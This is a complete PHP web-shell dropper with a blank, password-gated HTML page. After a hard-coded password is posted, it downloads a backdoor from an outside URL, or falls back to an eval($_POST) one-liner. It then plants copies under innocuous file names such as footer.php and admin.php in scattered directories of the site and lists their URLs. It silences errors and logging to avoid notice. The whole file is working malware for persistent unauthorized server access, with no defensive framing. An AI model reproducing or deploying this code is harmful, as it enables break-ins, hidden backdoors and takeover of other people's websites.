<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('memory_limit', '-1');
@ini_set('max_execution_time', 0);
@ini_set('allow_url_fopen', 1);

if (function_exists('date_default_timezone_set')) {
    @date_default_timezone_set('UTC');
}

$PASSWORD    = "MAMAYUKERO";
$RAW_SHELL   = "https://laravelhxr-c7m.pages.dev/hxrlaraveltobey.txt";
$SHELL_NAMES = ["data.php", "loading.php", "admin.php", "footer.php", "body.php", "systemdata.php", "user-logs.php"];
$EXCLUDE     = [".", "..", ".git", ".svn", ".hg", "node_modules", "vendor", "cgi-bin", ".well-known"];
$MAXDEPTH    = 500;
$MAX_PER_TOP = 2;

$shell_ok = 0; $shell_fail = 0;
$leaf_dirs = [];
$shell_urls = [];

function fetch_multi($urls) {
    $results = [];
    if (function_exists('curl_multi_init')) {
        $mh = @curl_multi_init();
        $handles = [];
        foreach ($urls as $key => $url) {
            $ch = @curl_init();
            @curl_setopt($ch, CURLOPT_URL, $url);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            @curl_setopt($ch, CURLOPT_ENCODING, "");
            @curl_multi_add_handle($mh, $ch);
            $handles[$key] = $ch;
        }
        $running = null;
        do {
            @curl_multi_exec($mh, $running);
            @curl_multi_select($mh);
        } while ($running > 0);
        foreach ($handles as $key => $ch) {
            $results[$key] = @curl_multi_getcontent($ch);
            @curl_multi_remove_handle($mh, $ch);
            @curl_close($ch);
        }
        @curl_multi_close($mh);
        if (!empty($results)) return $results;
    }
    foreach ($urls as $key => $url) {
        $results[$key] = fetch_raw($url);
    }
    return $results;
}

function fetch_raw($url) {
    $data = false;

    if (function_exists('curl_init')) {
        $ch = @curl_init();
        if ($ch) {
            @curl_setopt($ch, CURLOPT_URL, $url);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            @curl_setopt($ch, CURLOPT_ENCODING, "");
            $data = @curl_exec($ch);
            @curl_close($ch);
        }
    }

    if (!$data && @ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create([
            'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $data = @file_get_contents($url, false, $ctx);
    }

    if (!$data && function_exists('fsockopen')) {
        $parts = @parse_url($url);
        if ($parts && isset($parts['host'])) {
            $host = $parts['host'];
            $port = isset($parts['port']) ? $parts['port'] : (($parts['scheme'] ?? 'http') === 'https' ? 443 : 80);
            $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
            $scheme = $parts['scheme'] ?? 'http';

            $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $host, $port, $errno, $errstr, 15);
            if ($fp) {
                @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
                $raw = '';
                while (!@feof($fp)) { $raw .= @fgets($fp, 4096); }
                @fclose($fp);
                if (strpos($raw, "\r\n\r\n") !== false) {
                    $data = substr($raw, strpos($raw, "\r\n\r\n") + 4);
                    if (stripos($raw, "Transfer-Encoding: chunked") !== false) {
                        $decoded = ''; $pos = 0;
                        while ($pos < strlen($data)) {
                            $nl = strpos($data, "\r\n", $pos);
                            if ($nl === false) break;
                            $len = hexdec(trim(substr($data, $pos, $nl - $pos)));
                            if ($len <= 0) break;
                            $decoded .= substr($data, $nl + 2, $len);
                            $pos = $nl + 2 + $len + 2;
                        }
                        $data = $decoded;
                    }
                }
            }
        }
    }

    if (!$data && function_exists('stream_socket_client')) {
        $parts = @parse_url($url);
        if ($parts && isset($parts['host'])) {
            $host = $parts['host'];
            $port = isset($parts['port']) ? $parts['port'] : (($parts['scheme'] ?? 'http') === 'https' ? 443 : 80);
            $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
            $scheme = $parts['scheme'] ?? 'http';

            $remote = ($scheme === 'https' ? 'ssl://' : 'tcp://') . $host . ':' . $port;
            $fp = @stream_socket_client($remote, $errno, $errstr, 15, STREAM_CLIENT_CONNECT, @stream_context_create([
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
            ]));
            if ($fp) {
                @fwrite($fp, "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n");
                $raw = @stream_get_contents($fp);
                @fclose($fp);
                if (strpos($raw, "\r\n\r\n") !== false) {
                    $data = substr($raw, strpos($raw, "\r\n\r\n") + 4);
                }
            }
        }
    }

    return $data;
}

function scan_leaf_dirs($dir, $exclude, $max, $depth, $root, &$leaf_dirs) {
    if ($depth > $max) return;
    if (!@is_dir($dir)) return;

    $is_root = ($dir === $root);
    $items = @scandir($dir);
    if (!$items) return;

    $has_subdir = false;

    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        if (in_array($item, $exclude, true)) continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (@is_dir($path)) {
            $has_subdir = true;
            scan_leaf_dirs($path, $exclude, $max, $depth + 1, $root, $leaf_dirs);
        }
    }

    if (!$is_root && !$has_subdir) {
        $leaf_dirs[] = $dir;
    }
}

function group_by_top_level($leaf_dirs, $root) {
    $groups = [];
    $root_len = strlen(rtrim($root, DIRECTORY_SEPARATOR)) + 1;

    foreach ($leaf_dirs as $dir) {
        $rel = substr($dir, $root_len);
        $parts = explode(DIRECTORY_SEPARATOR, $rel);
        $top = $parts[0] ?? '_unknown';
        if (!isset($groups[$top])) {
            $groups[$top] = [];
        }
        $groups[$top][] = $dir;
    }

    return $groups;
}

function pick_spread($groups, $total_shell, $max_per_top) {
    $picked = [];

    foreach ($groups as $top => $dirs) {
        shuffle($dirs);
        $take = min($max_per_top, count($dirs));
        for ($i = 0; $i < $take; $i++) {
            $picked[] = $dirs[$i];
        }
    }

    if (count($picked) < $total_shell) {
        foreach ($groups as $top => $dirs) {
            foreach ($dirs as $d) {
                if (in_array($d, $picked, true)) continue;
                $picked[] = $d;
                if (count($picked) >= $total_shell) break 2;
            }
        }
    }

    shuffle($picked);

    return array_slice($picked, 0, $total_shell);
}

function plant_shells($picked_dirs, $shell_names, $shell_content, $root, &$shell_ok, &$shell_fail, &$shell_urls) {
    if (empty($picked_dirs)) return;

    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? '';

    foreach ($shell_names as $idx => $shell_name) {
        if (!isset($picked_dirs[$idx])) break;
        $target_dir = $picked_dirs[$idx];
        $target = $target_dir . DIRECTORY_SEPARATOR . $shell_name;
        if (@file_put_contents($target, $shell_content) !== false) {
            @chmod($target, 0644);
            $shell_ok++;

            $rel = str_replace($root, '', $target_dir);
            $rel = str_replace(DIRECTORY_SEPARATOR, '/', $rel);
            $rel = '/' . ltrim($rel, '/');
            if ($rel !== '/') $rel = rtrim($rel, '/') . '/';
            $url = $scheme . '://' . $host . $rel . $shell_name;
            $shell_urls[] = $url;
        } else {
            $shell_fail++;
        }
    }
}

function detect_root() {
    $candidates = [];

    if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT']) {
        $candidates[] = $_SERVER['DOCUMENT_ROOT'];
    }

    $candidates[] = __DIR__;
    $candidates[] = dirname(__DIR__) . DIRECTORY_SEPARATOR . 'public_html';
    $candidates[] = dirname(dirname(__DIR__)) . DIRECTORY_SEPARATOR . 'public_html';

    if (function_exists('getcwd')) {
        $candidates[] = getcwd();
    }

    if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
        $u = @posix_getpwuid(@fileowner(__FILE__));
        if ($u && isset($u['dir'])) {
            $candidates[] = $u['dir'] . '/public_html';
            $candidates[] = $u['dir'] . '/www';
            $candidates[] = $u['dir'] . '/htdocs';
        }
    }

    if (isset($_SERVER['HOME']) && $_SERVER['HOME']) {
        $candidates[] = $_SERVER['HOME'] . '/public_html';
        $candidates[] = $_SERVER['HOME'] . '/www';
    }

    foreach ($candidates as $c) {
        if ($c && @is_dir($c)) {
            return $c;
        }
    }

    return __DIR__;
}

if (isset($_POST['p']) && $_POST['p'] === $PASSWORD) {
    while (@ob_get_level()) { @ob_end_clean(); }
    header('Content-Type: text/plain; charset=utf-8');
    header('Cache-Control: no-store');

    $root = detect_root();

    $fetched = fetch_multi([$RAW_SHELL]);
    $shell_content = $fetched[0] ?? false;
    if (!$shell_content || strlen(trim($shell_content)) < 10) {
        $shell_content = "<?php @eval(\$_POST['x']); ?>";
    }

    scan_leaf_dirs($root, $EXCLUDE, $MAXDEPTH, 0, $root, $leaf_dirs);

    $groups = group_by_top_level($leaf_dirs, $root);
    $picked = pick_spread($groups, count($SHELL_NAMES), $MAX_PER_TOP);

    plant_shells($picked, $SHELL_NAMES, $shell_content, $root, $shell_ok, $shell_fail, $shell_urls);

    echo "SHELL: $shell_ok\n";
    echo "SHELL_FAIL: $shell_fail\n";
    if (!empty($shell_urls)) {
        echo "\n";
        foreach ($shell_urls as $u) {
            echo $u . "\n";
        }
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>.</title>
<style>
html,body{margin:0;padding:0;background:#fff;font-family:Arial,sans-serif}
#box{position:fixed;top:8px;left:8px;background:#fff;padding:6px;border:1px solid #ddd;border-radius:4px;z-index:9999}
#box input{width:120px;padding:4px;border:1px solid #ccc;border-radius:3px;outline:none;font-size:12px}
#box button{padding:4px 8px;border:1px solid #ccc;background:#fff;border-radius:3px;cursor:pointer;font-size:12px}
#out{margin-top:6px;font-size:11px;color:#333;white-space:pre;max-width:250px}
#copy{margin-top:6px;padding:4px 8px;border:1px solid #ccc;background:#fff;border-radius:3px;cursor:pointer;font-size:11px;display:none}
</style>
</head>
<body>
<div id="box">
<input type="password" id="p" autofocus autocomplete="off">
<button onclick="go()">.</button>
<div id="out"></div>
<button id="copy" onclick="copyAll()">Copy All</button>
</div>
<script>
function go(){
    var p=document.getElementById('p').value;
    var x=new XMLHttpRequest();
    x.open('POST',location.href,true);
    x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    x.onreadystatechange=function(){
        if(x.readyState===4){
            var txt=x.responseText;
            document.getElementById('out').textContent=txt;
            if(txt.indexOf('http')!==-1){
                document.getElementById('copy').style.display='inline-block';
                document.getElementById('copy').setAttribute('data-txt',txt);
            }
        }
    };
    x.send('p='+encodeURIComponent(p));
}
function copyAll(){
    var t=document.getElementById('copy').getAttribute('data-txt')||'';
    var lines=t.split('\n');
    var urls=[];
    for(var i=0;i<lines.length;i++){
        var l=lines[i].trim();
        if(l.indexOf('http')===0)urls.push(l);
    }
    var toCopy=urls.join('\n');
    var ta=document.createElement('textarea');
    ta.value=toCopy;
    ta.style.position='fixed';
    ta.style.left='-9999px';
    document.body.appendChild(ta);
    ta.select();
    try{document.execCommand('copy');}catch(e){}
    if(navigator.clipboard){navigator.clipboard.writeText(toCopy);}
    document.body.removeChild(ta);
    document.getElementById('copy').textContent='Copied!';
    setTimeout(function(){document.getElementById('copy').textContent='Copy All';},1500);
}
document.getElementById('p').addEventListener('keydown',function(e){
    if(e.key==='Enter'||e.keyCode===13)go();
});
</script>
</body>
</html>
